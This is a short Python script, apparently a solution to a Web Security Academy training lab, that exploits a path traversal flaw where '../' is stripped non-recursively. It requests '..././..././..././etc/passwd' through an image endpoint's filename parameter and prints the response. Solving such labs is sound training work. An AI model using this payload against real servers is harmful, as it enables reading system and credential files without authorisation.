# Vulnerability :- Path Traversal
# Lab Name :- File path traversal, traversal sequences stripped non-recursively

import requests

url = "https://0a20004204eed3f986cb6c89009000af.web-security-academy.net" # Change Me Without Trailing Slashes
def i_am_attacking():
    payload = "..././..././..././etc/passwd"
    payload_with_url = f"{url}/image?filename={payload}"
    response = requests.get(payload_with_url)
    print()
    print(response.text)
i_am_attacking()